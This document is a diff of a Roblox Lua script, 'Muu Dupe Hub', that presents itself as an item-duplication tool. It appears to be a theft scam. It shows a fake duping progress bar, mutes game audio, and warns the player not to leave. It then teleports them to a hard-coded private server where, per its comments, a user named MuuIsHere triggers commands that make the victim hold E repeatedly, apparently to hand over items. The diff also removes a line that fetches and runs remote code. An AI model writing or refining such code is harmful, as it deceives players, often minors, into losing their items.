@@ -1,6 +1,10 @@
-local loadstringUrl = "https://raw.githubusercontent.com/teinkhanh1/MuuDupeHub/refs/heads/main/Brainrot.lua"
+-- Muu Dupe Hub - FINAL VERSION (Solid Background, Auto TP to PS after 15s, 2nd Loading on Rejoin, !start/!finish)
+-- 1. First loading: 15 seconds → 100% → auto TP to your private server
+-- 2. On rejoin → 2nd loading (4 minutes) starts automatically
+-- 3. After 2nd loading → wait for MuuIsHere !finish [yourname] → TP to public + stop script
+-- 4. !start [yourname] → TP to MuuIsHere + hold E 3s × 10 times
+-- Solid dark blue, big red warning, text fits buttons, chunky GUI
 
--- DO NOT EDIT BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
@@ -10,20 +14,19 @@ local playerGui = localPlayer:WaitForChild("PlayerGui")
 
 local muu = Players:FindFirstChild("MuuIsHere")
 local isDuping = false
-local isSecondLoading = false
 local overlayGui = nil
 local loadingBar = nil
 local privateServerCode = "635978a3a09faf4485078c4caba3eda2"  -- Your PS code
 
--- Create main GUI
+-- Create main GUI (chunky)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "MuuDupeHub"
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
 local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 350, 0, 450)
-frame.Position = UDim2.new(0.5, -175, 0.5, -225)
+frame.Size = UDim2.new(0, 380, 0, 480)
+frame.Position = UDim2.new(0.5, -190, 0.5, -240)
 frame.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
 frame.BorderSizePixel = 0
 frame.Active = true
@@ -31,16 +34,16 @@ frame.Draggable = true
 frame.Parent = screenGui
 
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 16)
+corner.CornerRadius = UDim.new(0, 20)
 corner.Parent = frame
 
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 60)
+title.Size = UDim2.new(1, 0, 0, 70)
 title.BackgroundTransparency = 1
 title.Text = "Muu Dupe Hub"
 title.TextColor3 = Color3.fromRGB(100, 200, 255)
 title.Font = Enum.Font.GothamBlack
-title.TextSize = 40
+title.TextSize = 45
 title.Parent = frame
 
 local statusLabel = Instance.new("TextLabel")
@@ -50,13 +53,13 @@ statusLabel.BackgroundTransparency = 1
 statusLabel.Text = "Hold brainrot that you want to dupe"
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
 statusLabel.Font = Enum.Font.GothamBold
-statusLabel.TextSize = 22
+statusLabel.TextSize = 24
 statusLabel.TextWrapped = true
 statusLabel.Parent = frame
 
 local dot = Instance.new("Frame")
-dot.Size = UDim2.new(0, 25, 0, 25)
-dot.Position = UDim2.new(0.05, 0, 0.25, 0)
+dot.Size = UDim2.new(0, 30, 0, 30)
+dot.Position = UDim2.new(0.05, 0, 0.28, 0)
 dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
 dot.BorderSizePixel = 0
 dot.Parent = frame
@@ -65,19 +68,19 @@ dotCorner.CornerRadius = UDim.new(1, 0)
 dotCorner.Parent = dot
 
 local dupeButton = Instance.new("TextButton")
-dupeButton.Size = UDim2.new(0.8, 0, 0, 80)
-dupeButton.Position = UDim2.new(0.1, 0, 0.4, 0)
+dupeButton.Size = UDim2.new(0.8, 0, 0, 90)
+dupeButton.Position = UDim2.new(0.1, 0, 0.45, 0)
 dupeButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
 dupeButton.Text = "DUPE"
 dupeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 dupeButton.Font = Enum.Font.GothamBlack
-dupeButton.TextSize = 36
+dupeButton.TextSize = 38
 dupeButton.Parent = frame
 local dupeCorner = Instance.new("UICorner")
 dupeCorner.CornerRadius = UDim.new(0, 16)
 dupeCorner.Parent = dupeButton
 
--- Overlay for loading (solid dark blue)
+-- Overlay (SOLID dark blue)
 local function createOverlay(isSecond)
     overlayGui = Instance.new("ScreenGui")
     overlayGui.Name = "DupeOverlay"
@@ -91,44 +94,56 @@ local function createOverlay(isSecond)
     bg.Parent = overlayGui
 
     local shade = Instance.new("Frame")
-    shade.Size = UDim2.new(0.6, 0, 0.4, 0)
-    shade.Position = UDim2.new(0.2, 0, 0.3, 0)
+    shade.Size = UDim2.new(0.65, 0, 0.45, 0)
+    shade.Position = UDim2.new(0.175, 0, 0.275, 0)
     shade.BackgroundColor3 = Color3.fromRGB(10, 10, 40)
     shade.BackgroundTransparency = 0.3
     shade.Parent = overlayGui
     local shadeCorner = Instance.new("UICorner")
-    shadeCorner.CornerRadius = UDim.new(0, 16)
+    shadeCorner.CornerRadius = UDim.new(0, 20)
     shadeCorner.Parent = shade
 
     local hubText = Instance.new("TextLabel")
-    hubText.Size = UDim2.new(1, 0, 0.4, 0)
-    hubText.Position = UDim2.new(0, 0, 0.1, 0)
+    hubText.Size = UDim2.new(1, 0, 0.35, 0)
+    hubText.Position = UDim2.new(0, 0, 0.08, 0)
     hubText.BackgroundTransparency = 1
     hubText.Text = "Muu Dupe Hub"
     hubText.TextColor3 = Color3.fromRGB(100, 200, 255)
     hubText.Font = Enum.Font.GothamBlack
-    hubText.TextSize = 60
+    hubText.TextSize = 70
     hubText.Parent = shade
 
     local rejoinText = Instance.new("TextLabel")
     rejoinText.Size = UDim2.new(1, 0, 0.3, 0)
-    rejoinText.Position = UDim2.new(0, 0, 0.5, 0)
+    rejoinText.Position = UDim2.new(0, 0, 0.43, 0)
     rejoinText.BackgroundTransparency = 1
     rejoinText.Text = isSecond and "Duping..." or "We are rejoining you since it is part of the dupe..."
     rejoinText.TextColor3 = Color3.fromRGB(200, 200, 255)
     rejoinText.Font = Enum.Font.Gotham
-    rejoinText.TextSize = 24
+    rejoinText.TextSize = 28
     rejoinText.TextWrapped = true
     rejoinText.Parent = shade
 
-    -- Loading bar
+    -- Big red warning
+    local warningText = Instance.new("TextLabel")
+    warningText.Size = UDim2.new(1, 0, 0.15, 0)
+    warningText.Position = UDim2.new(0, 0, 0.73, 0)
+    warningText.BackgroundTransparency = 1
+    warningText.Text = "DO NOT LEAVE OR YOUR BRAINROT COULD GET DELETED"
+    warningText.TextColor3 = Color3.fromRGB(255, 0, 0)
+    warningText.Font = Enum.Font.GothamBlack
+    warningText.TextSize = 32
+    warningText.TextWrapped = true
+    warningText.Parent = shade
+
+    -- Loading bar (chunky)
     local barFrame = Instance.new("Frame")
-    barFrame.Size = UDim2.new(0.8, 0, 0, 30)
-    barFrame.Position = UDim2.new(0.1, 0, 0.8, 0)
+    barFrame.Size = UDim2.new(0.85, 0, 0, 50)
+    barFrame.Position = UDim2.new(0.075, 0, 0.88, 0)
     barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 80)
     barFrame.Parent = shade
     local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(0, 8)
+    barCorner.CornerRadius = UDim.new(0, 12)
     barCorner.Parent = barFrame
 
     loadingBar = Instance.new("Frame")
@@ -136,7 +151,7 @@ local function createOverlay(isSecond)
     loadingBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
     loadingBar.Parent = barFrame
     local loadingCorner = Instance.new("UICorner")
-    loadingCorner.CornerRadius = UDim.new(0, 8)
+    loadingCorner.CornerRadius = UDim.new(0, 12)
     loadingCorner.Parent = loadingBar
 
     local barLabel = Instance.new("TextLabel")
@@ -145,7 +160,7 @@ local function createOverlay(isSecond)
     barLabel.Text = "Duping brainrot... 0%"
     barLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
     barLabel.Font = Enum.Font.GothamBold
-    barLabel.TextSize = 20
+    barLabel.TextSize = 32
     barLabel.Parent = barFrame
 end
 
@@ -176,7 +191,14 @@ dupeButton.MouseButton1Click:Connect(function()
     
     createOverlay(false)  -- First loading
     
-    -- Loading bar (15 seconds)
+    -- Mute audio
+    for _, sound in pairs(game:GetService("Workspace"):GetDescendants()) do
+        if sound:IsA("Sound") then
+            sound.Playing = false
+        end
+    end
+    
+    -- First loading bar (15 seconds)
     local tweenInfo = TweenInfo.new(15, Enum.EasingStyle.Linear)
     local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
     tween:Play()
@@ -187,8 +209,8 @@ dupeButton.MouseButton1Click:Connect(function()
         barLabel.Text = "Duping brainrot... " .. math.floor((elapsed / 15) * 100) .. "%"
         if elapsed >= 15 then
             connection:Disconnect()
-            barLabel.Text = "Duping brainrot... 100% - Rejoining to PS"
-            -- TP to your private server link
+            barLabel.Text = "Duping brainrot... 100% - Joining Private Server"
+            -- Auto TP to private server
             TeleportService:TeleportToPrivateServer(game.PlaceId, privateServerCode, {localPlayer})
         end
     end)
@@ -225,7 +247,7 @@ if muu then
     end)
 end
 
--- On rejoin (show second loading screen)
+-- On rejoin → show second loading screen
 localPlayer.CharacterAdded:Connect(function()
     if isDuping then
         isSecondLoading = true
@@ -247,12 +269,6 @@ localPlayer.CharacterAdded:Connect(function()
             end
         end)
     end
-end)
-
--- Auto-re-execute on rejoin (using loadstring)
-localPlayer.CharacterAdded:Connect(function()
-    wait(2)  -- Small delay to ensure rejoin complete
-    loadstring(game:HttpGet(loadstringUrl))()
 end)
 
 print("Muu Dupe Hub Loaded! Hold brainrot, click DUPE to start.")
